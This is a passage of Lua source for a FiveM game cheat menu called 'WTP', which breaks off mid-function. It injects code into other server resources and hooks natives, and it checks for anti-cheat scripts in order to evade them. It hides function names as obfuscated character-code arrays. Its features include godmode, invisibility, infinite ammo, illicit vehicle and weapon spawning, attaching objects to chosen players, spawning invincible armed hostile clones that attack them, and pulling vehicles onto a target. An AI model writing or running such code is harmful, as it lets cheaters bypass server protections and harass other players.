            if _G.WTPFreecamObject then WTP.SafeRunNative(DestroyCam, _G.WTPFreecamObject, false) _G.WTPFreecamObject = nil end
            WTP.SafeRunNative(SetFocusEntity, PlayerPedId())
        ]])
    end
end

function WTP:EnableInfiniteAmmo(checked)
    if checked then
        if not _G.InfiniteAmmo then
            _G.InfiniteAmmo = true
            CreateThread(function()
                while _G.InfiniteAmmo do
                    Wait(0)
                    local ped = PlayerPedId()
                    local _, weapon = GetCurrentPedWeapon(ped, true)
                    if weapon and weapon ~= 0 then
                        local w1, w2 = GetMaxAmmoInClip(ped, weapon, true)
                        local maxClip = type(w2) == "number" and w2 or (type(w1) == "number" and w1 or 999)
                        if maxClip > 0 then
                            SetAmmoInClip(ped, weapon, maxClip)
                        end
                        SetPedAmmo(ped, weapon, 999999)
                        if IsPedShooting(ped) then
                            local ammo = GetAmmoInPedWeapon(ped, weapon)
                            SetPedAmmo(ped, weapon, (type(ammo) == "number" and ammo or 999) + 1)
                        end
                    end
                end
            end)
        end
    else
        _G.InfiniteAmmo = false
    end
end

function WTP:SpawnSelectedObject(playerIds)
    if not playerIds or #playerIds == 0 then
        self:Notify("error", "WTP", "No players selected!", 3000)
        return
    end
    local model = self:GetSelectedObjectModel()
    if not model or #model == 0 then
        self:Notify("error", "WTP", "Invalid object model!", 3000)
        return
    end
    local successCount = 0
    for _, playerId in ipairs(playerIds) do
        MachoInjectResource(targetSafeRes, string.format([[
            Citizen.CreateThread(function()
                local awidaowdhoa = {
                    ["GetHashKey"] = GetHashKey,
                    ["RequestModel"] = RequestModel,
                    ["GetGameTimer"] = GetGameTimer,
                    ["HasModelLoaded"] = HasModelLoaded,
                    ["Wait"] = Citizen.Wait,
                    ["GetActivePlayers"] = GetActivePlayers,
                    ["GetPlayerServerId"] = GetPlayerServerId,
                    ["GetPlayerPed"] = GetPlayerPed,
                    ["DoesEntityExist"] = DoesEntityExist,
                    ["GetEntityCoords"] = GetEntityCoords,
                    ["CreateObject"] = CreateObject,
                    ["SetEntityAsMissionEntity"] = SetEntityAsMissionEntity,
                    ["FreezeEntityPosition"] = FreezeEntityPosition,
                    ["AttachEntityToEntity"] = AttachEntityToEntity,
                    ["SetModelAsNoLongerNeeded"] = SetModelAsNoLongerNeeded
                }

                local sid = %d
                local modelName = "%s"
                local model = awidaowdhoa["GetHashKey"](modelName)

                awidaowdhoa["RequestModel"](model)
                local timeout = awidaowdhoa["GetGameTimer"]() + 5000
                while not awidaowdhoa["HasModelLoaded"](model) and awidaowdhoa["GetGameTimer"]() < timeout do
                    awidaowdhoa["Wait"](10)
                end
                
                if not awidaowdhoa["HasModelLoaded"](model) then return end

                local function getPedBySid(s)
                    for _, pid in ipairs(awidaowdhoa["GetActivePlayers"]()) do
                        if awidaowdhoa["GetPlayerServerId"](pid) == s then 
                            return awidaowdhoa["GetPlayerPed"](pid) 
                        end
                    end
                    return 0
                end

                local targetPed = getPedBySid(sid)
                if targetPed ~= 0 and awidaowdhoa["DoesEntityExist"](targetPed) then
                    local coords = awidaowdhoa["GetEntityCoords"](targetPed)
                    local obj = awidaowdhoa["CreateObject"](model, coords.x, coords.y, coords.z, true, true, false)
                    
                    if obj ~= 0 and awidaowdhoa["DoesEntityExist"](obj) then
                        awidaowdhoa["SetEntityAsMissionEntity"](obj, true, true)
                        awidaowdhoa["FreezeEntityPosition"](obj, true)
                        awidaowdhoa["AttachEntityToEntity"](obj, targetPed, 0, 0.0, 0.5, 0.0, 0.0, 0.0, 0.0, false, false, true, false, 0, true)
                    end
                end
                awidaowdhoa["SetModelAsNoLongerNeeded"](model)
            end)
        ]], playerId, model))
        successCount = successCount + 1
    end
end

function WTP:SpawnSelectedObjects(playerIds)
    if not playerIds or #playerIds == 0 then
        self:Notify("error", "WTP", "No players selected!", 3000)
        return
    end
    local model = self:GetSelectedObjectModel()
    if not model or #model == 0 then
        self:Notify("error", "WTP", "Invalid object model!", 3000)
        return
    end
    local successCount = 0
    for _, playerId in ipairs(playerIds) do
        MachoInjectResource(targetSafeRes, string.format([[
            Citizen.CreateThread(function()
                local awidaowdhoa = {
                    ["GetHashKey"] = GetHashKey,
                    ["RequestModel"] = RequestModel,
                    ["GetGameTimer"] = GetGameTimer,
                    ["HasModelLoaded"] = HasModelLoaded,
                    ["Wait"] = Citizen.Wait,
                    ["GetActivePlayers"] = GetActivePlayers,
                    ["GetPlayerServerId"] = GetPlayerServerId,
                    ["GetPlayerPed"] = GetPlayerPed,
                    ["DoesEntityExist"] = DoesEntityExist,
                    ["GetEntityCoords"] = GetEntityCoords,
                    ["CreateObject"] = CreateObject,
                    ["SetEntityAsMissionEntity"] = SetEntityAsMissionEntity,
                    ["FreezeEntityPosition"] = FreezeEntityPosition,
                    ["AttachEntityToEntity"] = AttachEntityToEntity,
                    ["SetModelAsNoLongerNeeded"] = SetModelAsNoLongerNeeded
                }

                local sid = %d
                local modelName = "%s"
                local model = awidaowdhoa["GetHashKey"](modelName)

                awidaowdhoa["RequestModel"](model)
                local timeout = awidaowdhoa["GetGameTimer"]() + 5000
                while not awidaowdhoa["HasModelLoaded"](model) and awidaowdhoa["GetGameTimer"]() < timeout do
                    awidaowdhoa["Wait"](10)
                end
                
                if not awidaowdhoa["HasModelLoaded"](model) then return end

                local function getPedBySid(s)
                    for _, pid in ipairs(awidaowdhoa["GetActivePlayers"]()) do
                        if awidaowdhoa["GetPlayerServerId"](pid) == s then 
                            return awidaowdhoa["GetPlayerPed"](pid) 
                        end
                    end
                    return 0
                end

                local targetPed = getPedBySid(sid)
                if targetPed ~= 0 and awidaowdhoa["DoesEntityExist"](targetPed) then
                    local coords = awidaowdhoa["GetEntityCoords"](targetPed)
                    local obj = awidaowdhoa["CreateObject"](model, coords.x, coords.y, coords.z, true, true, false)
                    
                    if obj ~= 0 and awidaowdhoa["DoesEntityExist"](obj) then
                        awidaowdhoa["SetEntityAsMissionEntity"](obj, true, true)
                        awidaowdhoa["FreezeEntityPosition"](obj, true)
                    end
                end
                awidaowdhoa["SetModelAsNoLongerNeeded"](model)
            end)
        ]], playerId, model))
        successCount = successCount + 1
    end
end

local isSpectatorListVisible = false
Citizen.CreateThread(function()
    while true do
        Citizen.Wait(1000)

        if isSpectatorListVisible then
            local playerCoords = GetEntityCoords(PlayerPedId())
            local updatedSpecs = {}

            local players = GetActivePlayers()
            for _, playerId in ipairs(players) do
                local ped = GetPlayerPed(playerId)

                if DoesEntityExist(ped) and playerId ~= PlayerId() then
                    local isVisible = IsEntityVisible(ped)
                    local dist = #(playerCoords - GetEntityCoords(ped))

                    if not isVisible and dist < 500.0 then
                        table.insert(updatedSpecs, {
                            id = GetPlayerServerId(playerId),
                            name = GetPlayerName(playerId),
                            distance = string.format("%.0fm", dist)
                        })
                    end
                end
            end

            WTP:SendMessage({
                action = "displaySpectators",
                visible = true,
                spectators = updatedSpecs
            })
        end
    end
end)

local targetResource = nil
if GetResourceState("es_extended") == "started" and GetResourceState("timeless-emotes") == "started" then
    targetResource = "es_extended"
elseif GetResourceState("core") == "started" and GetResourceState("timeless-emotes") == "started" then
    targetResource = "core"
end

function WTP:GodemodeState(checked)
    if GetResourceState('VynxAC') == 'started' then
        local ped = PlayerPedId()
        SetEntityInvincible(ped, checked)
    else
        executeCode('any', string.format([[
            local setPed = PlayerPedId()
            WTP.SafeRunNative(SetEntityInvincible, setPed, %s)
        ]], tostring(checked)))
    end
end

function WTP:EnableInvisibility(checked)
    if GetResourceState('VynxAC') == 'started' then
        local ped = PlayerPedId()
        SetEntityVisible(ped, not checked, false)
    else
        executeCode('any', string.format([[
            local selfPed = PlayerPedId()
            WTP.SafeRunNative(SetEntityVisible, selfPed, not %s, false)
        ]], tostring(checked)))
    end
end

function WTP:HandleAttackClonePlayer(playerIds)
    if not playerIds or #playerIds == 0 then return end

    local playerIdsStr = table.concat(playerIds, ",")
    MachoHookNative(0x240A18690AE96513, function(modelHash)
        return true, modelHash
    end)

    MachoHookNative(0xD49F9B0955C367DE, function(model, x, y, z, heading, isNetwork, thisScriptCheck)
        return true, model, x, y, z, heading, isNetwork, thisScriptCheck
    end)

    MachoInjectResourceRaw(targetSafeRes, string.format([[
        local function decode(tbl)
            local s = ""
            for i = 1, #tbl do s = s .. string.char(tbl[i]) end
            return s
        end
        local function g(n)
            return _G[decode(n)]
        end
        local function wait(n)
            return Citizen.Wait(n)
        end
        local function findClientIdByServerId(sid)
            local players = g({71,101,116,65,99,116,105,118,101,80,108,97,121,101,114,115})()
            for _, pid in ipairs(players) do
                if g({71,101,116,80,108,97,121,101,114,83,101,114,118,101,114,73,100})(pid) == sid then
                    return pid
                end
            end
            return nil
        end
        local function copyPedAppearance(sourcePed, targetPed)
            for i = 0, 11 do
                local drawable = g({71,101,116,80,101,100,68,114,97,119,97,98,108,101,86,97,114,105,97,116,105,111,110})(sourcePed, i)
                local texture = g({71,101,116,80,101,100,84,101,120,116,117,114,101,86,97,114,105,97,116,105,111,110})(sourcePed, i)
                g({83,101,116,80,101,100,67,111,109,112,111,110,101,110,116,86,97,114,105,97,116,105,111,110})(targetPed, i, drawable, texture, 2)
            end
            for i = 0, 7 do
                local propIndex = g({71,101,116,80,101,100,80,114,111,112,73,110,100,101,120})(sourcePed, i)
                local propTexture = g({71,101,116,80,101,100,80,114,111,112,84,101,120,116,117,114,101,73,110,100,101,120})(sourcePed, i)
                if propIndex ~= -1 then
                    g({83,101,116,80,101,100,80,114,111,112})(targetPed, i, propIndex, propTexture)
                else
                    g({67,108,101,97,114,80,101,100,80,114,111,112})(targetPed, i)
                end
            end
            local headBlendData = {g({71,101,116,80,101,100,72,101,97,100,66,108,101,110,100,68,97,116,97})(sourcePed)}
            if headBlendData[1] then
                g({83,101,116,80,101,100,72,101,97,100,66,108,101,110,100,68,97,116,97})(
                    targetPed,
                    headBlendData[2], -- shapeFirst
                    headBlendData[3], -- shapeSecond
                    headBlendData[4], -- shapeThird
                    headBlendData[5], -- skinFirst
                    headBlendData[6], -- skinSecond
                    headBlendData[7], -- skinThird
                    headBlendData[8], -- shapeMix
                    headBlendData[9], -- skinMix
                    headBlendData[10] -- thirdMix
                )
            end
        end
        local function clonePed(ped)
            local coords = g({71,101,116,69,110,116,105,116,121,67,111,111,114,100,115})(ped)
            local heading = g({71,101,116,69,110,116,105,116,121,72,101,97,100,105,110,103})(ped)
            local modelHash = g({71,101,116,69,110,116,105,116,121,77,111,100,101,108})(ped)
            g({82,101,113,117,101,115,116,77,111,100,101,108})(modelHash)
            local timeout = 0
            while not g({72,97,115,77,111,100,101,108,76,111,97,100,101,100})(modelHash) and timeout < 500 do
                wait(10)
                timeout = timeout + 1
            end
            if not g({72,97,115,77,111,100,101,108,76,111,97,100,101,100})(modelHash) then return end
            -- Spawn ped 2 units away from player
            local spawnRadius = 2.0
            local spawnX = coords.x + (math.random() * 2 - 1) * spawnRadius
            local spawnY = coords.y + (math.random() * 2 - 1) * spawnRadius
            local spawnZ = coords.z
            local clone = g({67,114,101,97,116,101,80,101,100})(4, modelHash, spawnX, spawnY, spawnZ, heading, true, true)
            if clone and g({68,111,101,115,69,110,116,105,116,121,69,120,105,115,116})(clone) then
                copyPedAppearance(ped, clone)
                g({83,101,116,69,110,116,105,116,121,65,115,77,105,115,115,105,111,110,69,110,116,105,116,121})(clone, true, true)
                g({83,101,116,77,111,100,101,108,65,115,78,111,76,111,110,103,101,114,78,101,101,100,101,100})(modelHash)
                local cloneGroup = g({65,100,100,82,101,108,97,116,105,111,110,115,104,105,112,71,114,111,117,112})("HOSTILE_CLONE_" .. tostring(clone))
                g({83,101,116,80,101,100,82,101,108,97,116,105,111,110,115,104,105,112,71,114,111,117,112,72,97,115,104})(clone, cloneGroup)
                g({83,101,116,82,101,108,97,116,105,111,110,115,104,105,112,66,101,116,119,101,101,110,71,114,111,117,112,115})(5, cloneGroup, g({71,101,116,72,97,115,104,75,101,121})("PLAYER"))
                g({83,101,116,82,101,108,97,116,105,111,110,115,104,105,112,66,101,116,119,101,101,110,71,114,111,117,112,115})(5, g({71,101,116,72,97,115,104,75,101,121})("PLAYER"), cloneGroup)
                
                local weaponHash = g({71,101,116,72,97,115,104,75,101,121})(decode({87,69,65,80,79,78,95,83,84,85,78,71,85,78}))
                g({71,105,118,101,87,101,97,112,111,110,84,111,80,101,100})(clone, weaponHash, 1000, false, true)
                local weaponEntity = g({71,101,116,67,117,114,114,101,110,116,80,101,100,87,101,97,112,111,110,69,110,116,105,116,121,73,110,100,101,120})(clone)
                if weaponEntity and g({68,111,101,115,69,110,116,105,116,121,69,120,105,115,116})(weaponEntity) then
                    g({83,101,116,69,110,116,105,116,121,65,115,77,105,115,115,105,111,110,69,110,116,105,116,121})(weaponEntity, true, true)
                end
                g({83,101,116,80,101,100,68,114,111,112,115,87,101,97,112,111,110,115,87,104,101,110,68,101,97,100})(clone, false)
                g({83,101,116,80,101,100,67,97,110,83,119,105,116,99,104,87,101,97,112,111,110})(clone, false)
                g({84,97,115,107,67,111,109,98,97,116,80,101,100})(clone, ped, 0, 16)
                g({83,101,116,80,101,100,67,111,109,98,97,116,65,116,116,114,105,98,117,116,101,115})(clone, 0, true) -- Always aggressive
                g({83,101,116,80,101,100,70,108,101,101,65,116,116,114,105,98,117,116,101,115})(clone, 0, false) -- Prevent fleeing
                g({83,101,116,69,110,116,105,116,121,73,110,118,105,110,99,105,98,108,101})(clone, true)
                g({83,101,116,80,101,100,67,97,110,82,97,103,100,111,108,108})(clone, false)
            end
        end
        local playerIds = {%s}
        for _, targetServerId in ipairs(playerIds) do
            local clientId = findClientIdByServerId(targetServerId)
            local ped = clientId and g({71,101,116,80,108,97,121,101,114,80,101,100})(clientId) or nil
            if ped and g({68,111,101,115,69,110,116,105,116,121,69,120,105,115,116})(ped) then
                clonePed(ped)
            end
        end
    ]], playerIdsStr))
end

function WTP:SpawnSelectedVehicle(model)
    if not model or model == "" then return end
    local handled = false

    if not handled and GetResourceState("17mov_BuilderJob") == "started" then
        handled = true
        MachoInjectResource2(3, '17mov_BuilderJob', string.format([[
            local playerPed = PlayerPedId()
            local coords = GetEntityCoords(playerPed)
            local heading = GetEntityHeading(playerPed)
            local spawnCoords = vector4(coords.x, coords.y, coords.z, heading)

            SpawnVehicle('%s', spawnCoords, true)
        ]], model))
    elseif not handled and GetResourceState("17mov_WindowCleaning") == "started" then
        handled = true
        MachoInjectResource2(3, '17mov_WindowCleaning', string.format([[
            local playerPed = PlayerPedId()
            local coords = GetEntityCoords(playerPed)
            local heading = GetEntityHeading(playerPed)
            local spawnCoords = vector4(coords.x, coords.y, coords.z, heading)

            SpawnVehicle('%s', spawnCoords, true)
        ]], model))
    elseif not handled and GetResourceState("17mov_GarbageCollector") == "started" then
        handled = true
        MachoInjectResource2(3, '17mov_GarbageCollector', string.format([[
            local playerPed = PlayerPedId()
            local coords = GetEntityCoords(playerPed)
            local heading = GetEntityHeading(playerPed)
            local spawnCoords = vector4(coords.x, coords.y, coords.z, heading)

            SpawnVehicle('%s', spawnCoords, true)
        ]], model))
    elseif not handled and GetResourceState("17mov_Deliverer") == "started" then
        handled = true
        MachoInjectResource2(3, '17mov_Deliverer', string.format([[
            local playerPed = PlayerPedId()
            local coords = GetEntityCoords(playerPed)
            local heading = GetEntityHeading(playerPed)
            local spawnCoords = vector4(coords.x, coords.y, coords.z, heading)

            SpawnVehicle('%s', spawnCoords, true)
        ]], model))
    elseif not handled and GetResourceState("17mov_Electrician") == "started" then
        handled = true
        MachoInjectResource2(3, '17mov_Electrician', string.format([[
            local playerPed = PlayerPedId()
            local coords = GetEntityCoords(playerPed)
            local heading = GetEntityHeading(playerPed)
            local spawnCoords = vector4(coords.x, coords.y, coords.z, heading)

            SpawnVehicle('%s', spawnCoords, true)
        ]], model))
    elseif not handled and GetResourceState("17mov_Postman") == "started" then
        handled = true
        MachoInjectResource2(3, '17mov_Postman', string.format([[
            local playerPed = PlayerPedId()
            local coords = GetEntityCoords(playerPed)
            local heading = GetEntityHeading(playerPed)
            local spawnCoords = vector4(coords.x, coords.y, coords.z, heading)

            SpawnVehicle('%s', spawnCoords, true)
        ]], model))
    elseif not handled and GetResourceState("lb-phone") == "started" then
        handled = true
        MachoInjectResourceRaw("lb-phone", ([[ 
            local model = "%s"
            if type(CreateFrameworkVehicle) == "function" then
                local ped = PlayerPedId()
                if DoesEntityExist(ped) then
                    local coords = GetEntityCoords(ped)
                    if coords then
                        local vehicleData = { vehicle = json.encode({ model = model }) }
                        CreateFrameworkVehicle(vehicleData, coords)
                    end
                end
            end
        ]]):format(model))
    elseif not handled and GetResourceState("jg-advancedgarages") == "started" then
        handled = true

        MachoInjectResourceRaw("jg-advancedgarages", string.format([[
            local coords = GetEntityCoords(PlayerPedId())
            spawnVehicleClient(1, %q, 'WTP', coords, false, {}, false)
        ]], model))
    elseif not handled and GetResourceState("es_extended") == "started" then
        handled = true
        local coords = GetEntityCoords(PlayerPedId())
        local heading = GetEntityHeading(PlayerPedId())
        MachoInjectResourceRaw("es_extended", string.format([[
            local model = "%s"
            local coords = vector3(%f, %f, %f)
            local heading = %f
        
            if ESX and ESX.Game and ESX.Game.SpawnVehicle then
                ESX.Game.SpawnVehicle(model, coords, heading, function(vehicle)
                    if DoesEntityExist(vehicle) then
                        SetPedIntoVehicle(PlayerPedId(), vehicle, -1)
                    end
                end)
            end
        ]], model, coords.x, coords.y, coords.z, heading))
    end
end

function WTP:SpawnSelectedWeapon(weaponModel)
    if not weaponModel or weaponModel == "" then return end

    local weaponHash = GetHashKey(weaponModel)
    if weaponHash == 0 then return end

    executeCode('any', string.format([[
        local setWeapon = %s
        WTP.SafeRunNative(GiveWeaponToPed, PlayerPedId(), setWeapon, 250, 0, true)
    ]], weaponHash))
end

function WTP:HandleClonePlayer(playerIds)
    if not playerIds or #playerIds == 0 then return end

    local playerIdsStr = table.concat(playerIds, ",")
    MachoInjectResourceRaw(targetSafeRes, string.format([[
        local function decode(tbl)
            local s = ""
            for i = 1, #tbl do s = s .. string.char(tbl[i]) end
            return s
        end
        local function g(n)
            return _G[decode(n)]
        end
        local function wait(n)
            return Citizen.Wait(n)
        end
        local function findClientIdByServerId(sid)
            local players = g({71,101,116,65,99,116,105,118,101,80,108,97,121,101,114,115})()
            for _, pid in ipairs(players) do
                if g({71,101,116,80,108,97,121,101,114,83,101,114,118,101,114,73,100})(pid) == sid then
                    return pid
                end
            end
            return nil
        end
        local playerIds = {%s}
        for _, targetServerId in ipairs(playerIds) do
            local clientId = findClientIdByServerId(targetServerId)
            local ped = clientId and g({71,101,116,80,108,97,121,101,114,80,101,100})(clientId) or nil
            if ped and g({68,111,101,115,69,110,116,105,116,121,69,120,105,115,116})(ped) then
                local coords = g({71,101,116,69,110,116,105,116,121,67,111,111,114,100,115})(ped)
                local hash = g({71,101,116,69,110,116,105,116,121,77,111,100,101,108})(ped)
                g({82,101,113,117,101,115,116,77,111,100,101,108})(hash)
                while not g({72,97,115,77,111,100,101,108,76,111,97,100,101,100})(hash) do
                    wait(0)
                end
                g({67,114,101,97,116,101,80,101,100})(4, hash, coords.x, coords.y, coords.z, 0.0, true, true)
            end
        end
    ]], playerIdsStr))
end

function WTP:ToggleBlackHole(state, targetServerId)
    if state then
        self:Notify("success", "WTP", "Black Hole Activated", 3000)
        executeCode(targetRes, string.format([[
            _G.isBlackholeActive = true
            WTP.SafeRunNative(CreateThread, function()
                local targetSid = %d
                local player = GetPlayerFromServerId(targetSid)
                local targetPed = GetPlayerPed(player)
                
                if not DoesEntityExist(targetPed) then targetPed = PlayerPedId() end

                while _G.isBlackholeActive do
                    local targetCoords = GetEntityCoords(targetPed)
                    local vehicles = GetGamePool("CVehicle")
                    
                    for _, vehicle in ipairs(vehicles) do
                        if DoesEntityExist(vehicle) and vehicle ~= GetVehiclePedIsIn(targetPed, false) then
                            if not NetworkHasControlOfEntity(vehicle) then
                                NetworkRequestControlOfEntity(vehicle)
                            end

                            local vehCoords = GetEntityCoords(vehicle)
                            local distance = #(targetCoords - vehCoords)

                            if distance < 250.0 and distance > 2.0 then
                                local dir = targetCoords - vehCoords
                                local force = 25.0 
                                local velocity = (dir / distance) * force
                                WTP.SafeRunNative(SetEntityVelocity, vehicle, velocity.x, velocity.y, velocity.z + 1.5)
                            end
                        end
                    end
                    WTP.SafeRunNative(Wait, 0)
                end
            end)
        ]], targetServerId or -1))
    else
        self:Notify("info", "WTP", "Black Hole Deactivated", 3000)
        MachoInjectResourceRaw(targetRes, [[
            _G.isBlackholeActive = false
        ]])
    end
end

function WTP:BuildMenuFromWeaponList(categoryWeapons)
    local menuValues = {}

    for _, model in ipairs(categoryWeapons) do
        if WeaponList[model] then
            menuValues[#menuValues + 1] = WeaponList[model].label
        end
    end

    return menuValues
end

function WTP:GetWeaponModelFromLabel(modelLabel)
    for model, data in pairs(WeaponList) do
        if data.label == modelLabel then
            return model
        end
    end

    return ""
end

function WTP:BuildDefaultMenu()
    ActiveMenu = {
        {
            label = "Self Options",
            type = "subMenu",
            icon = "ph ph-person",
            categories = {
                {
                    label = "Player",
                    tabs = {
                        { icon = "", type = "scrollable", value = 1, values = { "Native", "Script"}, label = "Revive",
                            onSelect = function(value)
                                if value == "Native" then
                                    executeCode("any", [[
                                        local selfPed = PlayerPedId()
                                        local c = GetEntityCoords(selfPed)
                                        WTP.SafeRunNative(NetworkResurrectLocalPlayer, c.x, c.y, c.z, GetEntityHeading(selfPed), true, false)
                                        WTP.SafeRunNative(SetEntityHealth, selfPed, 200)
                                        WTP.SafeRunNative(ClearPedTasksImmediately, selfPed)
                                    ]])
                                elseif value == "Script" then
                                    if GetResourceState("VynxAC") == "started" then
                                        executeCode('any', [[
                                            WTP.SafeRunNative(TriggerEvent, "sxph:revive")
                                        ]])
                                    elseif GetResourceState("svsecured") == "started" then
                                        executeCode('esx_ambulance', [[
                                            WTP.SafeRunNative(TriggerEvent, 'esx_ambulance:revive')
                                        ]])
                                    elseif GetResourceState("esx_ambulancejob") == "started" then
                                        MachoInjectResourceScriptOverride(1, "esx_ambulancejob", [[
                                            stopPlayerDeath({
                                                command = true
                                            })
                                        ]], '=?', 150, 160)
                                    elseif GetResourceState("ars_ambulancejob") == "started" then
                                        executeCode('ars_ambulancejob', [[
                                            stopPlayerDeath()
                                        ]])
                                    elseif GetResourceState("wasabi_ambulance") == "started" then
                                        executeCode('wasabi_ambulance', [[
                                            TriggerEvent('wasabi_ambulance:revive')
                                        ]])
                                    elseif GetResourceState("cfx-keydi-deathscreen") == "started" then
                                        executeCode('cfx-keydi-deathscreen', [[
                                            WTP.SafeRunNative(TriggerEvent, 'cfx-keydi-ambulance:revive')
                                        ]])
                                    else
                                        local playerPed = PlayerPedId()
                                        local coords = GetEntityCoords(playerPed)
                                        TriggerScreenblurFadeOut(0)
                                        SetEntityCoordsNoOffset(playerPed, coords.x, coords.y, coords.z, false, false, false)
                                        NetworkResurrectLocalPlayer(coords.x, coords.y, coords.z, heading, 0, false)
                                        SetPlayerInvincible(playerPed, false)
                                        ClearPedBloodDamage(playerPed)

                                        executeCode('any', [[
                                            WTP.SafeRunNative(TriggerServerEvent, 'esx:onPlayerSpawn')
                                            WTP.SafeRunNative(TriggerEvent, 'esx:onPlayerSpawn')
                                            WTP.SafeRunNative(TriggerEvent, 'playerSpawned')
                                        ]])
                                    end
                                end
                            end
                        },
                        { type = "slider", label = "Health", desc = "This will set your health to the desired amount.", scrollType = "onEnter", value = 100, min = 0, max = 100, step = 1.0,
                            onSelect = function(value)
                                if GetResourceState("VynxAC") == "started" then
                                    executeCode('any', string.format([[
                                        local setPed = PlayerPedId()
                                        if DoesEntityExist(setPed) and not IsEntityDead(setPed) then
                                            WTP.SafeRunNative(SetEntityHealth, setPed, %s)
                                        end
                                    ]], value))
                                else
                                    executeCode('monitor', string.format([[
                                        WTP.SafeRunNative(SetEntityHealth, PlayerPedId(), %s + 100.0)
                                    ]], value))
                                end
                            end
                        },
                        { type = "slider", label = "Armour", desc = "This will set your armour to the desired amount.", scrollType = "onEnter", value = 100, min = 0, max = 100, step = 1.0,
                            onSelect = function(value)
                                if GetResourceState("VynxAC") == "started" then
                                    executeCode('any', string.format([[
                                        local setPed = PlayerPedId()
                                        if DoesEntityExist(setPed) and not IsEntityDead(setPed) then
                                            WTP.SafeRunNative(SetPedArmour, setPed, %s)
                                        end
                                    ]], value))
                                else
                                    executeCode('monitor', string.format([[
                                        WTP.SafeRunNative(SetPedArmour, PlayerPedId(), %s)
                                    ]], value))
                                end
                            end
                        },
                        { icon = "", type = "button", label = "Heal & Armor", desc = "This will refill your heal and armour to the maximum value.",
                            onSelect = function()
                                if GetResourceState("VynxAC") == "started" then
                                    executeCode('any', [[
                                        local setPed = PlayerPedId()
                                        if DoesEntityExist(setPed) and not IsEntityDead(setPed) then
                                            WTP.SafeRunNative(SetEntityHealth, setPed, GetEntityMaxHealth(setPed))
                                            WTP.SafeRunNative(SetPedArmour, setPed, 100)
                                        end
                                    ]])
                                else
                                    executeCode('any', [[
                                        WTP.SafeRunNative(SetEntityHealth, PlayerPedId(), 200)
                                        WTP.SafeRunNative(SetPedArmour, PlayerPedId(), 100)
                                    ]])
                                end
                            end
                        },
                        { icon = "", type = "button", label = "Hunger & Thirst", desc = "This refill your Hunger / Thirst.",
                            onSelect = function()
                                if GetResourceState("rryban_secure") == "started" then
                                    executeCode('esx_basicneeds', [[
                                        WTP.SafeRunNative(TriggerEvent, 'esx_status:set', 'hunger', 1000000)
                                        WTP.SafeRunNative(TriggerEvent, 'esx_status:set', 'thirst', 1000000)
                                        LocalPlayer.state:set('stress', -50)
                                    ]])
                                elseif GetResourceState("ars_ambulancejob") == "started" then
                                    MachoInjectResource2(NewThreadNs, 'ars_ambulancejob', [[
                                        healStatus()
                                    ]])
                                elseif GetResourceState("esx_status") == "started" then
                                    executeCode('any', [[
                                        WTP.SafeRunNative(TriggerEvent, 'esx_status:set', 'hunger', 1000000)
                                        WTP.SafeRunNative(TriggerEvent, 'esx_status:set', 'thirst', 1000000)
                                        WTP.SafeRunNative(TriggerEvent, 'esx_status:set', 'stress', 0)
                                        LocalPlayer.state:set('stress', -50)
                                    ]])
                                elseif GetResourceState("cfx-hu-core") == "started" then
                                    executeCode('any', [[
                                        WTP.SafeRunNative(TriggerEvent, "esx_basicneeds:healPlayer")
                                    ]])
                                elseif GetResourceState("es_extended") == "started" then
                                    executeCode('es_extended', [[
                                        WTP.SafeRunNative(TriggerEvent, 'es_extended:status:Add', 'hunger', 1000000)
                                        WTP.SafeRunNative(TriggerEvent, 'es_extended:status:Add', 'thirst', 1000000)
                                        WTP.SafeRunNative(TriggerEvent, 'es_extended:status:Remove', 'stress', 0)
                                    ]])
                                else
                                    executeCode('any', [[
                                        WTP.SafeRunNative(TriggerEvent, 'esx_status:set', 'hunger', 1000000)
                                        WTP.SafeRunNative(TriggerEvent, 'esx_status:set', 'thirst', 1000000)
                                        WTP.SafeRunNative(TriggerEvent, 'esx_status:set', 'stress', 0)
                                        LocalPlayer.state:set('stress', -50)
                                    ]])
                                end
                            end
                        },
                        { type = "checkbox", label = "Godmode", checked = false, desc = "This will give your player godmode.",
                            onSelect = function(checked)
                                self:GodemodeState(checked)
                            end
                        },
                        {
                            type = "checkbox",
                            label = "Invisibility",
                            checked = false,
                            desc = "This will make your player invisible.",
                            onSelect = function(checked)
                                self:EnableInvisibility(checked)
                            end
                        },
                        {
                            type = "checkbox",
                            label = "Super Strength",
                            checked = false,
                            desc = "This will make you super strength.",
                            onSelect = function(checked)
                                if checked then
                                    MachoInjectResource("any", [[
                                        if fgawjFmaDjdALaO == nil then fgawjFmaDjdALaO = false end
                                        fgawjFmaDjdALaO = true

                                        local holdingEntity = false
                                        local holdingCarEntity = false
                                        local holdingPed = false
                                        local heldEntity = nil
                                        local entityType = nil
                                        local awfhjawrasfs = CreateThread

                                        awfhjawrasfs(function()
                                            while fgawjFmaDjdALaO do
                                                Wait(0)
                                                if holdingEntity and heldEntity then
                                                    local playerPed = PlayerPedId()
                                                    local headPos = GetPedBoneCoords(playerPed, 0x796e, 0.0, 0.0, 0.0)
                                                    DrawText3Ds(headPos.x, headPos.y, headPos.z + 0.5, "[Y] Drop Entity / [U] Attach Ped")
                                                    
                                                    if holdingCarEntity and not IsEntityPlayingAnim(playerPed, 'anim@mp_rollarcoaster', 'hands_up_idle_a_player_one', 3) then
                                                        RequestAnimDict('anim@mp_rollarcoaster')
                                                        while not HasAnimDictLoaded('anim@mp_rollarcoaster') do
                                                            Wait(100)
                                                        end
                                                        TaskPlayAnim(playerPed, 'anim@mp_rollarcoaster', 'hands_up_idle_a_player_one', 8.0, -8.0, -1, 50, 0, false, false, false)
                                                    elseif (holdingPed or not holdingCarEntity) and not IsEntityPlayingAnim(playerPed, 'anim@heists@box_carry@', 'idle', 3) then
                                                        RequestAnimDict('anim@heists@box_carry@')
                                                        while not HasAnimDictLoaded('anim@heists@box_carry@') do
                                                            Wait(100)
                                                        end
                                                        TaskPlayAnim(playerPed, 'anim@heists@box_carry@', 'idle', 8.0, -8.0, -1, 50, 0, false, false, false)
                                                    end

                                                    if not IsEntityAttached(heldEntity) then
                                                        holdingEntity = false
                                                        holdingCarEntity = false
                                                        holdingPed = false
                                                        heldEntity = nil
                                                    end
                                                end
                                            end
                                        end)

                                        awfhjawrasfs(function()
                                            while fgawjFmaDjdALaO do
                                                Wait(0)
                                                local playerPed = PlayerPedId()
                                                local camPos = GetGameplayCamCoord()
                                                local camRot = GetGameplayCamRot(2)
                                                local direction = RotationToDirection(camRot)
                                                local dest = vec3(camPos.x + direction.x * 10.0, camPos.y + direction.y * 10.0, camPos.z + direction.z * 10.0)

